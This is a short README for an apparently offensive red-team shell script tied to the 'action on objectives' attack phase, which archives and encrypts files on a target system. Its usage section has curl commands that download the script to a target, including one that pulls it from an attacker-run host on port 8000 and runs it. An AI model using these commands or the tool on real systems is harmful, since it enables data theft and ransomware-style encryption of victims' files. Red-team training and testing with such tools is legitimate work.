# Action on Objectives Phase

The last phase includes the measures that are necessary to achieve the actual goal. This includes different techniques, which are applied depending on the defined goal. For example, if data needs to be stolen, it can be copied and removed. Furthermore, techniques for encryption, manipulation, destruction of data can be applied. Another goal can be the impairment of the availability of the system.

This script serves as a tool for some specified actions like encrypt files or directories.

## Features

- Create a compressed tar archive from given files or directories
- Unarchive given tar archive
- Encrypt given files or directories


## Usage

From github:
```sh
curl -LJO https://github.com/McSquizzy/red-team-toolbox/blob/main/action-on-objectives/action-on-objectives.sh
sh action-on-objectives.sh -h
```
Local network:
```sh
# Host
sh action-on-objectives.sh -w
# Target
curl -LJO <Host>:8000/
sh action-on-objectives.sh -h
```

### Parameters




## Results

Results are printed directly to STDOUT.

## Compatibility

The script uses /bin/sh syntax and is fully POSIX compatible so can run on most unix-based (POSIX/Unix/Linux) systems.

-----

## Additional Information

